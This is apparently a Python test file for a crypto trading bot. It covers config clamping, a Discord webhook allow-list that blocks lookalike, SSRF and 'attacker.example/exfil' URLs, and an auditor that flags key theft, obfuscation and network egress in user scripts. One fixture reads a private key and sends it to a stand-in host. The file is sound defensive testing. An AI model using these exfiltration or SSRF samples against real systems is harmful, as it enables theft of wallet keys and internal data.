from __future__ import annotations

import asyncio

import pytest

import polymarket_auth as ka
import webhook
from config import DEFAULT_CONFIG, merge_with_defaults


def test_oversized_fraction_is_clamped():
    assert merge_with_defaults({"max_size_fraction": 5.0})["max_size_fraction"] == 1.0
    assert merge_with_defaults({"min_cash_reserve_fraction": -2})["min_cash_reserve_fraction"] == 0.0


def test_entry_price_cents_clamped_and_ordered():
    c = merge_with_defaults({"min_entry_price_cents": 80, "max_entry_price_cents": 20})
    assert c["min_entry_price_cents"] == 20 and c["max_entry_price_cents"] == 80
    assert merge_with_defaults({"max_entry_price_cents": 500})["max_entry_price_cents"] == 99


def test_min_size_cannot_exceed_max_size():
    c = merge_with_defaults({"min_size_fraction": 0.5, "max_size_fraction": 0.1})
    assert c["min_size_fraction"] <= c["max_size_fraction"]


def test_stop_loss_forced_nonpositive_take_profit_nonnegative():
    assert merge_with_defaults({"stop_loss_on_day": 50})["stop_loss_on_day"] == -50.0
    assert merge_with_defaults({"stop_loss_on_day": -50})["stop_loss_on_day"] == -50.0
    assert merge_with_defaults({"stop_loss_on_day": 0})["stop_loss_on_day"] == 0.0
    assert merge_with_defaults(
        {"crypto15m_daily_loss_limit": 75})["crypto15m_daily_loss_limit"] == -75.0
    assert merge_with_defaults({"take_profit_on_day": -10})["take_profit_on_day"] == 0.0


def test_garbage_value_falls_back_to_default():
    assert merge_with_defaults({"max_size_fraction": "abc"})["max_size_fraction"] == \
        DEFAULT_CONFIG["max_size_fraction"]


def test_crypto15m_knobs_clamped():
    c = merge_with_defaults({"crypto15m_entry_threshold": 1.5, "crypto15m_order_size": 0})
    assert c["crypto15m_entry_threshold"] == 1.0
    assert c["crypto15m_order_size"] == 1


def test_crypto15m_maker_and_hours_knobs_clamped():
    c = merge_with_defaults({
        "crypto15m_entry_style": "yolo",
        "crypto15m_maker_cancel_min": 99,
        "crypto15m_hours_start_utc": -5,
        "crypto15m_hours_end_utc": 99,
    })
    assert c["crypto15m_entry_style"] == "taker"
    assert c["crypto15m_maker_cancel_min"] == 15.0
    assert c["crypto15m_hours_start_utc"] == 0
    assert c["crypto15m_hours_end_utc"] == 24


def test_camelcase_keys_still_clamped():
    assert merge_with_defaults({"maxSizeFraction": 9.0})["max_size_fraction"] == 1.0


def test_dpapi_roundtrip():
    if not ka._dpapi_available():
        pytest.skip("DPAPI is Windows-only")
    enc = ka._dpapi_encrypt(b"super-secret")
    assert enc != b"super-secret"
    assert ka._dpapi_decrypt(enc) == b"super-secret"
















@pytest.mark.parametrize("url", [
    "https://discord.com/api/webhooks/123/abc",
    "https://discordapp.com/api/webhooks/1/x",
    "https://canary.discord.com/api/webhooks/1/x",
    "https://ptb.discord.com/api/webhooks/1/x",
])
def test_webhook_allows_real_discord(url):
    assert webhook._is_allowed_webhook(url) is True


@pytest.mark.parametrize("url", [
    "http://discord.com/api/webhooks/1/x",
    "https://discord.com.evil.com/api/webhooks/1/x",
    "https://discord.com@evil.com/api/webhooks/1/x",
    "https://attacker.example/exfil",
    "https://127.0.0.1/x",
    "https://169.254.169.254/latest/meta-data/",
    "https://localhost:8080/x",
    "ftp://discord.com/x",
    "",
    "not-a-url",
])
def test_webhook_blocks_non_discord_and_ssrf(url):
    assert webhook._is_allowed_webhook(url) is False


def test_post_never_hits_network_for_blocked_url(monkeypatch):
    def _boom(*a, **k):
        raise AssertionError("httpx.AsyncClient must not be built for a blocked URL")
    monkeypatch.setattr(webhook.httpx, "AsyncClient", _boom)
    asyncio.run(webhook._post("https://attacker.example/exfil", {"hello": "world"}))


import script_audit as _sa


def test_audit_is_quiet_about_an_ordinary_strategy():
    code = (
        "def decide(ctx):\n"
        "    x = sorted([3, 1, 2])\n"
        "    log(f'lo {x[0]}')\n"
        "    if (ctx.get('minsLeft') or 99) < 2:\n"
        "        return {'side': 'up', 'price': 'ask', 'size': 3}\n"
        "    return None\n"
    )
    r = _sa.audit(code)
    assert r["ok"] and r["critical"] == 0 and not r["findings"], r


def test_audit_flags_network_egress():
    r = _sa.audit("import requests\ndef decide(ctx):\n    return None\n")
    assert not r["ok"] and "network" in r["categories"]


def test_audit_flags_the_app_wallet_module_by_name():
    r = _sa.audit("import polymarket_auth\ndef decide(ctx):\n    return None\n")
    assert not r["ok"] and "wallet" in r["categories"]
    assert any("WALLET KEY" in f["message"] for f in r["findings"]), r["findings"]


def test_audit_flags_credential_shaped_names():
    r = _sa.audit(
        "def decide(ctx):\n    private_key = ctx.get('x')\n    return None\n")
    assert not r["ok"] and "wallet" in r["categories"]


def test_wallet_plus_network_is_called_out_as_exfiltration():
    r = _sa.audit(
        "import urllib.request\n"
        "def decide(ctx):\n"
        "    k = ctx.get('private_key')\n"
        "    urllib.request.urlopen('http://x.example/' + str(k))\n"
        "    return None\n"
    )
    assert "exfiltration" in r["categories"]
    assert r["findings"][0]["category"] == "exfiltration", r["findings"][0]
    assert "key-stealing" in r["findings"][0]["message"]


def test_audit_flags_obfuscation_itself():
    for code in (
        "import base64\ndef decide(ctx):\n    return None\n",
        "def decide(ctx):\n    return exec('x=1')\n",
        "def decide(ctx):\n    return getattr(ctx, 'a' + 'b')\n",
        "def decide(ctx):\n    return __import__('os')\n",
    ):
        r = _sa.audit(code)
        assert not r["ok"] and "dynamic" in r["categories"], code


def test_audit_flags_an_encoded_payload_literal():
    blob = "QUJDREVG" * 40
    r = _sa.audit("def decide(ctx):\n    p = '" + blob + "'\n    return None\n")
    assert not r["ok"] and "dynamic" in r["categories"]


def test_audit_flags_process_and_filesystem_writes():
    r = _sa.audit(
        "import subprocess\n"
        "def decide(ctx):\n"
        "    open('x.txt', 'w').write('hi')\n"
        "    return None\n"
    )
    assert not r["ok"]
    assert "process" in r["categories"] and "filesystem" in r["categories"]


def test_audit_sees_through_import_aliases():
    r = _sa.audit(
        "import requests as r\n"
        "def decide(ctx):\n    r.post('http://x.example')\n    return None\n")
    assert not r["ok"] and "network" in r["categories"]
    assert any("requests.post" in f["message"] for f in r["findings"]), r["findings"]


def test_audit_reports_a_syntax_error_instead_of_claiming_clean():
    r = _sa.audit("def decide(ctx)\n    return None\n")
    assert not r["ok"] and not r["parsed"]
    assert "not audited" in r["summary"]


def test_audit_never_claims_a_script_is_safe():
    r = _sa.audit("def decide(ctx):\n    return None\n")
    assert "not proof it is safe" in r["summary"]
